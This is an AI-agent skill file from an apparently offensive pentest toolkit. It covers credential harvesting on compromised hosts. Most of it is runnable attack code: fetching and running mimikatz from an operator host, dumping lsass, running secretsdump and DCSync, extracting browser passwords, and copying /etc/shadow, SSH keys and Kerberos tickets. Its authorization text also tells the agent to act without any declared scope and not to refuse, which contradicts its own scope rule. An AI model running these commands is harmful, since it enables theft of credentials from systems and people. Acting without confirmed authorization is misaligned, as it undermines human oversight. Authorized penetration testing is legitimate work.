---
name: credential-harvest
description: "Credential extraction from a compromised host with sufficient privilege: mimikatz (Windows lsass / SAM), impacket-secretsdump (remote SAM / NTDS / LSA over SMB), browser credential extraction (Firefox NSS, Chrome SQLite), Linux keyring extraction. Produces hash material for password-attack and plaintext credentials for lateral movement."
version: 0.1.0
license: Apache-2.0
author: Scarlight contributors
platforms: [linux, macos]
prerequisites:
  commands: [python3, sqlite3, openssl]
metadata:
  scarlight:
    tags: [credentials, mimikatz, secretsdump, post-exploitation, offensive]
    phase: post-exploitation
    related_skills: [password-attack, privesc-linux, privesc-windows, lateral-movement]
    risk_level: destructive
---

# Credential-harvest — credential extraction from a compromised host

Extract hash material, session tokens, and plaintext credentials from a compromised host or remote system where the operator has sufficient privilege. Wraps `mimikatz` for Windows lsass / SAM extraction, `impacket-secretsdump` for remote SAM / NTDS / LSA over SMB, browser credential extraction (Firefox NSS, Chrome SQLite), and Linux keyring / `/etc/shadow` extraction.

This skill is **`destructive`** — see [`CONVENTIONS.md`](../CONVENTIONS.md) §1. It extracts secret material that, if mishandled, becomes an incident in itself. Every invocation is audited; cross-user extraction (e.g. dumping another user's browser store) is refused without explicit operator confirmation.

## When to use

- [`privesc-linux`](../privesc-linux/SKILL.md) / [`privesc-windows`](../privesc-windows/SKILL.md) achieved a privilege level that unlocks credential storage:
  - `SYSTEM` on Windows → lsass dump (mimikatz)
  - `root` on Linux → `/etc/shadow`, `/root/.ssh/`, `/var/log/auth.log`
  - Admin / domain-admin → remote `secretsdump` over SMB
  - Compromised user → that user's browser stores, keyring, history, `.ssh/known_hosts`
- A confirmed RCE from [`service-exploit`](../service-exploit/SKILL.md) or [`web-exploit`](../web-exploit/SKILL.md) lets you read credential material directly.

If the operator just wants a quick "what creds are on this host?" without a clear next step, audit-log the *intent* and stop. Credential extraction without a downstream use is operational sprawl.

## Hard prerequisite — authorization

Refer to [`CODE_OF_USE.md`](../../CODE_OF_USE.md) — Scarlight is for authorized engagements only. The engagement-scope guard is a first measure, not a substitute for the operator's legal responsibility. Engagements are **opt-in**: when an `engagement.yaml` is active its `targets:` list is enforced (and re-checked at skill entry as defense in depth); when **none** is declared the session runs **unscoped and permissive** — proceed with the task, do not demand a scope file or refuse for lack of one, and treat the operator as responsible under the policy above.

- Target host MUST be in `engagement.yaml`'s `targets:` list. Re-check at skill entry ([`CONVENTIONS.md`](../CONVENTIONS.md) §2). A compromise won via [`service-exploit`](../service-exploit/SKILL.md) does not extend scope.
- **Cross-user extraction** — extracting credentials belonging to a user other than the one whose shell the agent operates in (e.g. SYSTEM-privileged agent dumping a specific user's Chrome store) requires explicit operator confirmation. The skill body refuses by default. The reason: a SOW that authorizes pentesting "the web server" doesn't automatically authorize pulling the CEO's password vault, even though the technical access permits it.
- Browser / keyring extraction limits to the agent's compromised-user context unless the cross-user gate above is satisfied.
- This skill runs inside the compromised-host shell (Tier 2 sandbox exception per [`CONVENTIONS.md`](../CONVENTIONS.md) §6), except for `secretsdump` remote-over-SMB which runs from the Kali sandbox.

## Procedure

`$WORK="credential-harvest/$TARGET-$(date -u +%s)"`. On the target use `%TEMP%` (Windows) or `/tmp` (Linux); on the operator side use `~/.scarlight/findings/`.

### 1. Windows lsass — `mimikatz`

`mimikatz.exe` is bundled in the operator's Kali image and copied to target at runtime (see [`CONVENTIONS.md`](../CONVENTIONS.md) §11). Requires SYSTEM (or `SeDebugPrivilege` + `SeImpersonatePrivilege`).

```powershell
$mimiUrl = "http://$env:OPERATOR_HOST:$env:OPERATOR_PORT/mimikatz.exe"
Invoke-WebRequest -Uri $mimiUrl -OutFile "$WORK\m.exe" -UseBasicParsing
& "$WORK\m.exe" `
  "privilege::debug" `
  "log $WORK\mimi.log" `
  "sekurlsa::logonpasswords" `
  "sekurlsa::tickets /export" `
  "lsadump::sam" `
  "lsadump::secrets" `
  "exit" 2>&1 | Out-File "$WORK\mimi.txt"
Remove-Item "$WORK\m.exe" -Force
```

Defender flags `mimikatz.exe` on contact. If quarantined, surface the finding ("mimikatz blocked by Defender") and DO NOT chain to AMSI-bypass or obfuscated variants — that's the `specs/exploitation-v1/requirements.md` §6 EDR-evasion line.

Alternative: dump lsass to disk and process offline via `pypykatz`:

```powershell
# Process-dump lsass (requires SeDebugPrivilege)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id "$WORK\lsass.dmp" full
```

Then offline (Kali sandbox):

```bash
pypykatz lsa minidump "$LSASS_DMP" > "$WORK/pypykatz.txt"
```

`pypykatz` does not need to touch the target host — once the dmp is exfiltrated, parsing is operator-side, no further on-target tooling.

### 2. Remote SAM / NTDS — `impacket-secretsdump`

Run from the Kali sandbox; requires admin credentials (local admin → SAM; Domain Admin → NTDS via DRS replication).

```bash
# Local SAM via admin
impacket-secretsdump \
  "$DOMAIN/$ADMIN_USER:$ADMIN_PASS@$TARGET" \
  -outputfile "$WORK/secretsdump"

# Pass-the-hash variant
impacket-secretsdump \
  -hashes ":$NTLM_HASH" \
  "$DOMAIN/$ADMIN_USER@$TARGET" \
  -outputfile "$WORK/secretsdump"

# DCSync (DA credential → all domain hashes via replication, no NTDS file copy)
impacket-secretsdump \
  -just-dc \
  "$DOMAIN/$DA_USER:$DA_PASS@$DC" \
  -outputfile "$WORK/secretsdump-dc"
```

Produces:
- `secretsdump.sam` — local SAM hashes
- `secretsdump.lsa` — LSA secrets (cached creds, service account passwords)
- `secretsdump.ntds` — NTDS.dit dump (full AD hash table)

NTDS dump is the highest-impact action this skill can take. Operator MUST have a DA-level engagement annotation; the skill body checks `engagement.yaml` for an explicit acknowledgment of domain-wide credential extraction (`permitted_risk_level: destructive` per target, plus a notes-field acknowledgment recommended — see [`specs/exploitation-v1/requirements.md`](../../specs/exploitation-v1/requirements.md) §5.6).

### 3. Browser credentials — current user only

**Firefox (NSS-backed):**

```bash
# Linux/macOS — paths differ
PROFILE="$HOME/.mozilla/firefox/$(grep Default= ~/.mozilla/firefox/profiles.ini | head -1 | cut -d= -f2)"
cp "$PROFILE/key4.db" "$PROFILE/logins.json" "$WORK/"
# Decrypt offline on operator side using firefox_decrypt or python's NSS bindings
firefox_decrypt --csv "$WORK" > "$WORK/firefox-creds.csv"
```

**Chrome (SQLite + DPAPI on Windows, SQLite + libsecret on Linux):**

```bash
# Linux — Chrome / Chromium login data
cp "$HOME/.config/google-chrome/Default/Login Data" "$WORK/chrome-logins.db"
sqlite3 "$WORK/chrome-logins.db" \
  "SELECT origin_url, username_value, hex(password_value) FROM logins;" \
  > "$WORK/chrome-creds.txt"
# Password decryption requires libsecret access (same desktop session) or
# offline DPAPI on Windows — operator-side step
```

**Cross-user refusal pattern:**

```bash
TARGET_PROFILE_USER="$(stat -c '%U' "$PROFILE")"
CURRENT_USER="$(whoami)"
if [ "$TARGET_PROFILE_USER" != "$CURRENT_USER" ]; then
  if [ "${SCARLIGHT_CROSS_USER_HARVEST_OK:-}" != "1" ]; then
    echo "[credential-harvest] refused: cross-user extraction (profile owned by $TARGET_PROFILE_USER, agent is $CURRENT_USER)" >&2
    audit_log "credential-harvest" "$PROFILE" "browser-creds cross-user" "refused"
    exit 4
  fi
fi
```

The operator sets `SCARLIGHT_CROSS_USER_HARVEST_OK=1` to override (and the override produces its own audit entry).

### 4. Linux keyring + system credential stores

```bash
# /etc/shadow (root-only)
[ "$(id -u)" -eq 0 ] && cp /etc/shadow "$WORK/shadow" && cp /etc/passwd "$WORK/passwd"

# SSH keys (agent's user)
mkdir -p "$WORK/ssh"
cp -r "$HOME/.ssh/" "$WORK/ssh/" 2>/dev/null

# Bash history (often contains plaintext creds typed by accident)
cp "$HOME/.bash_history" "$WORK/bash-history" 2>/dev/null
grep -E "(pass(wd)?|secret|token|key)=" "$WORK/bash-history" > "$WORK/bash-history-creds.txt" 2>/dev/null

# /var/log/auth.log entries with creds in command lines
[ "$(id -u)" -eq 0 ] && \
  grep -E "(pass(wd)?|secret|token)" /var/log/auth.log* 2>/dev/null > "$WORK/auth-log-creds.txt"

# GNOME keyring (current user) — requires libsecret; runs in agent's desktop session if one exists
if command -v secret-tool >/dev/null 2>&1; then
  # Enumerate, do not auto-extract — keyring entries are often app-specific
  secret-tool search '' '' 2>/dev/null > "$WORK/gnome-keyring-index.txt"
fi
```

`/etc/shadow` extraction is one of the most-recovered hashes — feed straight into [`password-attack`](../password-attack/SKILL.md).

### 5. Kerberos tickets (Windows / domain context)

```powershell
# Captured by mimikatz step 1 already, but also via:
klist 2>&1 | Out-File "$WORK\klist.txt"
# Existing TGT export (mimikatz only — requires SYSTEM)
& "$WORK\m.exe" "privilege::debug" "sekurlsa::tickets /export" "exit"
```

Exported `.kirbi` tickets enable pass-the-ticket attacks; offline conversion to hashcat format via `impacket-ticketConverter`.

### 6. Audit logging

```bash
audit_log "credential-harvest" "$TARGET" "mimikatz logonpasswords + secretsdump remote SAM" "success"
```

For refusals (cross-user, missing privilege, OS mismatch):

```bash
audit_log "credential-harvest" "$TARGET" "browser-creds cross-user" "refused"
```

See [`CONVENTIONS.md`](../CONVENTIONS.md) §3.

## Output — what to record

Update the `credentials[]` array of the memory record ([`CONVENTIONS.md`](../CONVENTIONS.md) §7):

```json
{
  "credentials": [
    {
      "type": "ntlm-hash | lm-hash | sha512crypt | plaintext | kerberos-tgt | dpapi-blob | aes256-key",
      "user": "DOMAIN\\Administrator",
      "value": "...",
      "source": "mimikatz_logonpasswords | secretsdump_sam | secretsdump_ntds | shadow | firefox_nss | chrome_sqlite | bash_history",
      "host": "...",
      "captured_at": "2026-05-18T14:32:01Z",
      "cracked": false
    }
  ]
}
```

Also persist:

- `lsass.dmp` exfiltrated to operator host for offline `pypykatz`
- `secretsdump.{sam,lsa,ntds}` files
- `firefox/key4.db` + `logins.json` for offline decrypt
- Hash counts per source (e.g. "secretsdump.ntds: 12,343 NTLM hashes" — informs effort sizing on [`password-attack`](../password-attack/SKILL.md))

## Hand-off

| Material | Next skill |
|---|---|
| Any hash (NTLM, /etc/shadow, bcrypt, MD5) | [`password-attack`](../password-attack/SKILL.md) |
| Cleartext credential matching a service on a second authorized host | [`lateral-movement`](../lateral-movement/SKILL.md) (connect-and-confirm) or back to [`service-exploit`](../service-exploit/SKILL.md) (auth'd exploitation) |
| Kerberos TGT / TGS | [`lateral-movement`](../lateral-movement/SKILL.md) for pass-the-ticket |
| DPAPI blob | offline DPAPI decryption — out of v1.1 (`specs/exploitation-v1/requirements.md` §3.3 explicit non-goal) |
| Browser session cookie | session-replay pivot — out of v1.1 |

## What this skill is NOT for

- **DPAPI offline decryption** — explicit deferral (`specs/exploitation-v1/requirements.md` §3.3). Capture the blob, hand off to a future v1.2 spec.
- **Session-token replay** — pivot via stolen browser session cookie is out of v1.1; [`lateral-movement`](../lateral-movement/SKILL.md) handles credential / hash / key pivots only.
- **Cross-user extraction without explicit operator confirmation** — refuses by default. The override env var produces its own audit entry. The reason: technical capability ≠ operator authority.
- **Continuous monitoring** — one pass per target per run. No `pypykatz live` watcher, no `inotifywait` on credential files.
- **EDR evasion engineering** — explicit `specs/exploitation-v1/requirements.md` §6 deferral. If `mimikatz.exe` is quarantined, surface that; do NOT respond with AMSI-bypass or obfuscated variants.
- **Persistence installation** — no skeleton-key planting, no DCSync replication-permission grants, no `Set-LocalUser` for backdoor users.
- **Domain-wide NTDS dump without explicit operator acknowledgment** — `engagement.yaml` MUST flag the DC target with `permitted_risk_level: destructive` and the operator's notes-field acknowledgment. A bare SoW for "internal pentest" is not enough.
- **Targets not in the active engagement scope** — refuse, don't run.
- **OT / ICS / medical-device hosts** — `specs/mission.md` non-goal.
- **Autonomous 0-day exploitation** — `specs/mission.md` non-goal.
